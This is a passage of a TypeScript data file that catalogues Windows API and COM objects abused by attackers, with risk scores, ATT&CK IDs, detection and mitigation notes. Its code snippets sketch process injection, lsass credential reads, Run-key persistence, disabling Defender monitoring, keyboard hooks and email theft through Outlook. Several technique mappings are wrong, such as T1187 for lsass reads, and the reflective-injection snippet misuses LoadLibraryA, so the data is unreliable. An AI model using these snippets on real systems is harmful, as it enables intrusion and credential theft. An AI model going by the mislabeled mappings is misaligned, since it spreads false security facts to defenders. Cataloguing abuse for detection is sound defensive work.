      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Disable Script Host",
        "feasibility": "high"
      }
    ],
    "references": {
      "threat_actors": [
        "APT28",
        "APT29",
        "Lazarus"
      ],
      "malware_families": [
        "Emotet",
        "ZeuS",
        "TrickBot"
      ],
      "tools": [
        "Custom scripts",
        "Empire"
      ]
    },
    "tags": [
      "windows-com-api",
      "command-execution",
      "script",
      "critical"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "6e30f32f-1647-400a-bca5-d2582bd0d060",
    "name": "Word.Application COM Object",
    "category": "Windows Com",
    "subcategory": "persistence",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "Microsoft.Office.Interop.Word",
      "language": "COM",
      "documentation": "https://learn.microsoft.com/en-us/office/vba/api/word.application",
      "class": "Application",
      "function": ""
    },
    "techniques": [
      "T1137.001"
    ],
    "abuse_scenarios": [
      {
        "name": "Document macro execution",
        "technique_id": "T1137.001",
        "description": "Exploit Word macros for code execution",
        "code_snippet": "var word = new Word.Application(); word.Documents.Open(\"malicious.docm\"); word.Run(\"AutoOpen\");",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of Word.Application COM Object",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-com",
      "persistence",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "92c77267-2cf0-4931-a217-3203d2fd6428",
    "name": "access.Application COM Object",
    "category": "Windows Com Api",
    "subcategory": "code-execution",
    "risk": {
      "severity": "High",
      "prevalence": "low",
      "ease_of_abuse": "medium",
      "likelihood_in_real_attacks": 45
    },
    "api": {
      "namespace": "Access.Application",
      "language": "VBScript/C#/PowerShell",
      "documentation": "https://learn.microsoft.com/en-us/office/vba/api/access.application",
      "class": "",
      "function": ""
    },
    "techniques": [
      "T1203"
    ],
    "abuse_scenarios": [
      {
        "name": "Macro execution via Access",
        "technique_id": "T1203",
        "description": "Create and execute Access macros for code execution",
        "code_snippet": "Set app = CreateObject(\"Access.Application\"); app.OpenCurrentDatabase \"C:\\\\malicious.mdb\"; app.Run \"malicious_macro\"",
        "detection_difficulty": "medium",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "high",
        "notes": "Behavior detection of Access.Application creation"
      },
      {
        "vendor": "EDR",
        "effectiveness": "high",
        "notes": "Monitor for Office COM object abuse"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Disable Office COM object execution",
        "feasibility": "high"
      }
    ],
    "references": {
      "threat_actors": [
        "Scattered"
      ],
      "malware_families": [
        "Custom malware"
      ],
      "tools": []
    },
    "tags": [
      "windows-com-api",
      "macro",
      "code-execution"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "dc269a9a-f8bd-4445-b7b0-656c2846a756",
    "name": "advapi32.dll - RegOpenKeyEx",
    "category": "Windows Api",
    "subcategory": "registry-access",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "advapi32.dll",
      "language": "C/C++ (P/Invoke)",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa",
      "class": "RegOpenKeyEx",
      "function": ""
    },
    "techniques": [
      "T1112"
    ],
    "abuse_scenarios": [
      {
        "name": "Registry manipulation",
        "technique_id": "T1112",
        "description": "Access registry keys for persistence or data theft",
        "code_snippet": "RegOpenKeyEx(HKEY_LOCAL_MACHINE, \"Software\\\\Microsoft\\\\Windows\\\\Run\", 0, KEY_WRITE, &hKey);",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of advapi32.dll - RegOpenKeyEx",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-api",
      "registry-access",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "a50512dd-51f2-4111-8875-27e68220d855",
    "name": "advapi32.dll - RegSetValueEx",
    "category": "Windows Native Api",
    "subcategory": "registry-manipulation",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 85
    },
    "api": {
      "namespace": "advapi32.dll",
      "language": "C/C++ (P/Invoke)",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa",
      "class": "",
      "function": "RegSetValueEx"
    },
    "techniques": [
      "T1547.001",
      "T1562.001"
    ],
    "abuse_scenarios": [
      {
        "name": "Persistence via registry modification",
        "technique_id": "T1547.001",
        "description": "Write to Run/RunOnce registry keys to achieve persistence",
        "code_snippet": "RegSetValueEx(hKey, \"Malware\", 0, REG_SZ, (LPBYTE)\"C:\\\\malware.exe\", strlen(\"C:\\\\malware.exe\")+1);",
        "detection_difficulty": "easy",
        "common_in_campaigns": true
      },
      {
        "name": "Disable security features",
        "technique_id": "T1562.001",
        "description": "Modify Windows Defender or firewall settings",
        "code_snippet": "RegSetValueEx(hKey, \"DisableRealtimeMonitoring\", 0, REG_DWORD, (LPBYTE)&dwValue, sizeof(DWORD));",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Sysmon",
        "effectiveness": "high",
        "notes": "Event ID 13 - Registry Object Added or Modified"
      },
      {
        "vendor": "Windows Defender",
        "effectiveness": "high",
        "notes": "Behavioral detection of registry tampering"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Restrict registry write access via GPO",
        "feasibility": "high"
      },
      {
        "category": "monitoring",
        "description": "Monitor Run/RunOnce registry modifications",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [
        "APT1",
        "FIN7",
        "Lazarus"
      ],
      "malware_families": [
        "ZeuS",
        "Emotet",
        "Ransomware (various)"
      ],
      "tools": [
        "PSExec",
        "PsTools"
      ]
    },
    "tags": [
      "windows-native-api",
      "registry",
      "persistence"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "d4f7b037-613f-4778-9ade-408ed11e1466",
    "name": "kernel32.dll - CreateRemoteThread",
    "category": "Windows Native Api",
    "subcategory": "process-injection",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "medium",
      "likelihood_in_real_attacks": 85
    },
    "api": {
      "namespace": "kernel32.dll",
      "language": "C/C++ (P/Invoke)",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread",
      "class": "",
      "function": "CreateRemoteThread"
    },
    "techniques": [
      "T1055.001"
    ],
    "abuse_scenarios": [
      {
        "name": "Remote code injection",
        "technique_id": "T1055.001",
        "description": "Execute shellcode in remote process by creating a thread in another process",
        "code_snippet": "HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "high",
        "notes": "Suspicious CreateRemoteThread + VirtualAllocEx pattern detection"
      },
      {
        "vendor": "Splunk/Sysmon",
        "effectiveness": "high",
        "notes": "Monitor for CreateRemoteThread call followed by thread creation from suspicious memory"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Enable Code Integrity (HVCI) to prevent injection",
        "feasibility": "high"
      },
      {
        "category": "monitoring",
        "description": "Monitor Sysmon Event ID 8 for CreateRemoteThread",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [
        "APT28",
        "Lazarus",
        "APT33"
      ],
      "malware_families": [
        "Emotet",
        "IcedID",
        "AsyncRAT"
      ],
      "tools": [
        "Cobalt Strike",
        "Metasploit",
        "Empire"
      ]
    },
    "tags": [
      "windows-native-api",
      "process-injection",
      "rce",
      "widely-abused"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "4ff52a0c-2f93-45d6-87e9-0a5b48426f02",
    "name": "kernel32.dll - GetProcAddress",
    "category": "Windows Native Api",
    "subcategory": "api-resolution",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 90
    },
    "api": {
      "namespace": "kernel32.dll",
      "language": "C/C++ (P/Invoke)",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress",
      "class": "",
      "function": "GetProcAddress"
    },
    "techniques": [
      "T1036.004"
    ],
    "abuse_scenarios": [
      {
        "name": "API obfuscation",
        "technique_id": "T1036.004",
        "description": "Resolve API addresses at runtime to avoid static detection",
        "code_snippet": "typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE, LPVOID, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);\npCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"CreateRemoteThread\");",
        "detection_difficulty": "hard",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Sysmon",
        "effectiveness": "low",
        "notes": "Difficult to detect in isolation; combine with behavioral analysis"
      },
      {
        "vendor": "EDR",
        "effectiveness": "medium",
        "notes": "Monitor for excessive GetProcAddress calls from suspicious processes"
      }
    ],
    "mitigation": [
      {
        "category": "code",
        "description": "Prefer static linking for critical APIs",
        "feasibility": "high"
      }
    ],
    "references": {
      "threat_actors": [
        "APT28",
        "Lazarus",
        "APT29"
      ],
      "malware_families": [
        "Notpetya",
        "WannaCry (variant)"
      ],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-native-api",
      "api-resolution",
      "obfuscation"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "e72247d0-3c6b-4ae9-aadc-691cfb927593",
    "name": "kernel32.dll - LoadLibraryA/W",
    "category": "Windows Native Api",
    "subcategory": "module-loading",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 80
    },
    "api": {
      "namespace": "kernel32.dll",
      "language": "C/C++ (P/Invoke)",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya",
      "class": "",
      "function": "LoadLibraryA / LoadLibraryW"
    },
    "techniques": [
      "T1574.001",
      "T1055.001"
    ],
    "abuse_scenarios": [
      {
        "name": "DLL search order hijacking",
        "technique_id": "T1574.001",
        "description": "Load attacker-controlled DLL from writeable path before legitimate module",
        "code_snippet": "HMODULE hMod = LoadLibraryA(\"kernel32.dll\"); // Loads from %PATH% - can be hijacked",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      },
      {
        "name": "Reflective DLL injection",
        "technique_id": "T1055.001",
        "description": "Load custom DLL for in-memory execution without WriteFile to disk",
        "code_snippet": "HMODULE hMod = LoadLibraryA((LPCSTR)shellcode_buffer);",
        "detection_difficulty": "hard",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Sysmon",
        "effectiveness": "medium",
        "notes": "Event ID 7 (Image Load) - look for DLLs from unusual paths"
      },
      {
        "vendor": "Windows Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection of DLL search order anomalies"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Enforce strict DLL search order via registry",
        "feasibility": "high"
      },
      {
        "category": "code",
        "description": "Use absolute paths for LoadLibrary calls",
        "feasibility": "medium"
      }
    ],
    "references": {
      "threat_actors": [
        "APT1",
        "Lazarus",
        "FIN7"
      ],
      "malware_families": [
        "ZeuS",
        "Poison Ivy",
        "PlugX"
      ],
      "tools": [
        "Cobalt Strike",
        "PowerSploit"
      ]
    },
    "tags": [
      "windows-native-api",
      "dll-hijacking",
      "persistence"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "22e285d7-f098-4e5d-86c4-d9a087669fd4",
    "name": "kernel32.dll - OpenProcess + ReadProcessMemory",
    "category": "Windows Native Api",
    "subcategory": "memory-access",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "medium",
      "likelihood_in_real_attacks": 95
    },
    "api": {
      "namespace": "kernel32.dll",
      "language": "C/C++ (P/Invoke)",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess",
      "class": "",
      "function": "OpenProcess / ReadProcessMemory"
    },
    "techniques": [
      "T1187"
    ],
    "abuse_scenarios": [
      {
        "name": "Credential theft",
        "technique_id": "T1187",
        "description": "Read memory of lsass.exe to extract cached credentials",
        "code_snippet": "HANDLE hProcess = OpenProcess(PROCESS_VM_READ, FALSE, lsassPID);\nReadProcessMemory(hProcess, address, buffer, size, NULL);",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Sysmon",
        "effectiveness": "high",
        "notes": "Event ID 10 - Process Access to lsass.exe"
      },
      {
        "vendor": "Windows Defender",
        "effectiveness": "high",
        "notes": "Behavior detection of lsass access from non-system processes"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Enforce Windows Defender Credential Guard",
        "feasibility": "high"
      },
      {
        "category": "monitoring",
        "description": "Monitor OpenProcess calls to lsass.exe",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [
        "APT28",
        "APT29",
        "Lazarus"
      ],
      "malware_families": [
        "Mimikatz",
        "Lsass dumpers"
      ],
      "tools": [
        "Mimikatz",
        "ProcDump",
        "Comsvcs"
      ]
    },
    "tags": [
      "windows-native-api",
      "credential-access",
      "critical"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "00986378-8061-45f3-97d3-914b37e679f8",
    "name": "kernel32.dll - VirtualAllocEx + WriteProcessMemory",
    "category": "Windows Api",
    "subcategory": "process-injection",
    "risk": {
      "severity": "Critical",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "kernel32.dll",
      "language": "C/C++ (P/Invoke)",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex",
      "class": "VirtualAllocEx, WriteProcessMemory",
      "function": ""
    },
    "techniques": [
      "T1055.001"
    ],
    "abuse_scenarios": [
      {
        "name": "Process injection",
        "technique_id": "T1055.001",
        "description": "Allocate memory in remote process and write shellcode",
        "code_snippet": "VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); WriteProcessMemory(hProcess, addr, shellcode, size, NULL);",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of kernel32.dll - VirtualAllocEx + WriteProcessMemory",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-api",
      "process-injection",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "f31eecfb-5cb9-4094-be32-18424052ef80",
    "name": "ntdll.dll - NtCreateFile",
    "category": "Windows Api",
    "subcategory": "file-operations",
    "risk": {
      "severity": "High",
      "prevalence": "widespread",
      "ease_of_abuse": "easy",
      "likelihood_in_real_attacks": 70
    },
    "api": {
      "namespace": "ntdll.dll",
      "language": "C/C++ (P/Invoke)",
      "documentation": "https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatefile",
      "class": "NtCreateFile",
      "function": ""
    },
    "techniques": [
      "T1202"
    ],
    "abuse_scenarios": [
      {
        "name": "Bypass file access controls",
        "technique_id": "T1202",
        "description": "Use low-level API to bypass file access restrictions",
        "code_snippet": "NtCreateFile(&fileHandle, SYNCHRONIZE, &objAttr, &ioStatus, NULL, 0, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_ALERT, NULL, 0);",
        "detection_difficulty": "hard",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Microsoft Defender",
        "effectiveness": "medium",
        "notes": "Behavioral detection based on API patterns"
      }
    ],
    "mitigation": [
      {
        "category": "monitoring",
        "description": "Monitor usage of ntdll.dll - NtCreateFile",
        "feasibility": "easy"
      }
    ],
    "references": {
      "threat_actors": [],
      "malware_families": [],
      "tools": [
        "Cobalt Strike",
        "Mimikatz"
      ]
    },
    "tags": [
      "windows-api",
      "file-operations",
      "lotl"
    ],
    "author": "Claw",
    "created": "2026-01-31",
    "verified": true
  },
  {
    "id": "e09f2765-56eb-467d-a22f-6f0f3c86c140",
    "name": "outlook.Application COM Object",
    "category": "Windows Com Api",
    "subcategory": "data-exfiltration",
    "risk": {
      "severity": "High",
      "prevalence": "low",
      "ease_of_abuse": "medium",
      "likelihood_in_real_attacks": 50
    },
    "api": {
      "namespace": "Outlook.Application",
      "language": "VBScript/C#/PowerShell",
      "documentation": "https://learn.microsoft.com/en-us/office/vba/api/outlook.application",
      "class": "",
      "function": ""
    },
    "techniques": [
      "T1114.003"
    ],
    "abuse_scenarios": [
      {
        "name": "Email theft and sending",
        "technique_id": "T1114.003",
        "description": "Read emails from Outlook and exfiltrate data",
        "code_snippet": "Set outlook = CreateObject(\"Outlook.Application\") Set folder = outlook.GetNamespace(\"MAPI\").GetDefaultFolder(6) For Each mail In folder.Items ... Send(mail) ... Next",
        "detection_difficulty": "hard",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "EDR",
        "effectiveness": "medium",
        "notes": "Monitor Outlook.Application instantiation from non-Office processes"
      },
      {
        "vendor": "Email gateway",
        "effectiveness": "high",
        "notes": "Detect unusual email sending patterns"
      }
    ],
    "mitigation": [
      {
        "category": "policy",
        "description": "Restrict COM object creation from scripts",
        "feasibility": "medium"
      }
    ],
    "references": {
      "threat_actors": [
        "Advanced APTs"
      ],
      "malware_families": [
        "Sophisticated spyware"
      ],
      "tools": []
    },
    "tags": [
      "windows-com-api",
      "exfiltration",
      "email"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  },
  {
    "id": "9a0984a9-fa6c-4267-a73b-ed6e81024e57",
    "name": "user32.dll - SetWindowsHookEx",
    "category": "Windows Native Api",
    "subcategory": "hooking",
    "risk": {
      "severity": "High",
      "prevalence": "medium",
      "ease_of_abuse": "medium",
      "likelihood_in_real_attacks": 60
    },
    "api": {
      "namespace": "user32.dll",
      "language": "C/C++ (P/Invoke)",
      "documentation": "https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa",
      "class": "",
      "function": "SetWindowsHookEx"
    },
    "techniques": [
      "T1056.004",
      "T1546.011"
    ],
    "abuse_scenarios": [
      {
        "name": "Keyboard/mouse monitoring",
        "technique_id": "T1056.004",
        "description": "Install WH_KEYBOARD_LL or WH_MOUSE_LL hook to capture user input",
        "code_snippet": "HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hModule, 0);",
        "detection_difficulty": "medium",
        "common_in_campaigns": true
      },
      {
        "name": "Process manipulation",
        "technique_id": "T1546.011",
        "description": "Install WH_GETMESSAGE hook to inject code into other processes",
        "code_snippet": "HHOOK hHook = SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, hModule, 0);",
        "detection_difficulty": "hard",
        "common_in_campaigns": false
      }
    ],
    "detection": [
      {
        "vendor": "Sysmon",
        "effectiveness": "medium",
        "notes": "Monitor for SetWindowsHookEx calls from unusual processes"
      },
      {
        "vendor": "EDR",
        "effectiveness": "high",
        "notes": "Behavioral detection of hook installation and message interception"
      }
    ],
    "mitigation": [
      {
        "category": "code",
        "description": "Use modern input handling APIs instead of hooks",
        "feasibility": "medium"
      },
      {
        "category": "policy",
        "description": "Restrict SetWindowsHookEx via policy",
        "feasibility": "medium"
      }
    ],
    "references": {
      "threat_actors": [
        "APT28",
        "ZooPark"
      ],
      "malware_families": [
        "Poison Ivy",
        "RAT variants"
      ],
      "tools": [
        "Rootkits"
      ]
    },
    "tags": [
      "windows-native-api",
      "hooking",
      "surveillance"
    ],
    "author": "Claw",
    "created": "2026-02-02",
    "verified": true
  }
];

export function getAPIById(id: string): CompleteAPI | undefined {
  return API_DATA.find(api => api.id === id);
}

export function getAllAPIs(): CompleteAPI[] {
  return API_DATA;
}
